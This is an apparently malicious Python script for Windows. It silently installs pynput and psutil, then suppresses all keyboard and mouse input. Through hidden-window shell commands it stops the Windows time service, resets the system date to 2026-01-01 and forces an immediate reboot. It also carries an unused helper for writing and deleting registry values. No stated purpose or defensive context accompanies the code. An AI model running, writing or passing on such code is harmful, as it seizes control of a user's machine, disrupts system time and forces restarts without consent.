import os, sys, ctypes, time, subprocess, threading
import winreg
try:
  import psutil; import pynput
except:
  subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil', 'pynput']); import psutil; import pynput
def run_cmd(c): subprocess.Popen(c, shell=True, creationflags=0x08000000)
def reg_mod(p, n, v, a):
  try:
    rm={'HKLM':winreg.HKEY_LOCAL_MACHINE,'HKCU':winreg.HKEY_CURRENT_USER}; rk=winreg.HKEY_CURRENT_USER; cp=p
    if '\\' in p: px=p.split('\\')[0].upper(); rk=rm.get(px, rk); cp='\\'.join(p.split('\\')[1:])
    k=winreg.CreateKeyEx(rk, cp, 0, winreg.KEY_SET_VALUE|winreg.KEY_WRITE)
    if a==1: winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, int(v))
    else: winreg.DeleteValue(k, n)
    winreg.CloseKey(k)
  except: pass
kbd_listener = None; mouse_listener = None
def lock_keyboard(block):
  global kbd_listener
  if block:
    if not kbd_listener: kbd_listener = pynput.keyboard.Listener(suppress=True); kbd_listener.start()
  else:
    if kbd_listener: kbd_listener.stop(); kbd_listener = None
def lock_mouse(block):
  global mouse_listener
  if block:
    if not mouse_listener: mouse_listener = pynput.mouse.Listener(suppress=True); mouse_listener.start()
  else:
    if mouse_listener: mouse_listener.stop(); mouse_listener = None
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
lock_keyboard(True)
time.sleep(0.01)
lock_mouse(True)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
run_cmd('net stop w32time'); run_cmd('powershell -Command "Set-Date -Date \'2026-01-01 00:00:00\'"')
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
run_cmd('shutdown /r /t 0')
time.sleep(0.01)
